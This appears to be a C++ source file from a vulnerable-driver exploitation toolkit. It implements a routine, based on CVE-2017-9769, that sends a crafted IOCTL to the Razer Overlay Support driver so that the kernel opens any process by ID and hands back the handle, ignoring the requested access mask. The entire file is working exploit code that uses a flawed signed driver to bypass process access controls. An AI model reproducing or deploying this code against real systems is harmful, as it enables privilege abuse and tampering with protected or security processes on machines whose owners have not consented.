/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       RZPNK.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Razer Overlay Support driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/rzpnk.h"

//
// Based on CVE-2017-9769.
//

/*
* RazerOpenProcess
*
* Purpose:
*
* Call ZwOpenProcess via razer driver request.
*
*/
BOOL WINAPI RazerOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    BOOL bResult;
    RAZER_OPEN_PROCESS request;

    UNREFERENCED_PARAMETER(DesiredAccess);

    request.ProcessId = ProcessId;
    request.ProcessHandle = NULL;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_RZPNK_OPEN_PROCESS,
        &request,
        sizeof(request),
        &request,
        sizeof(request));

    *ProcessHandle = request.ProcessHandle;
    return bResult;
}
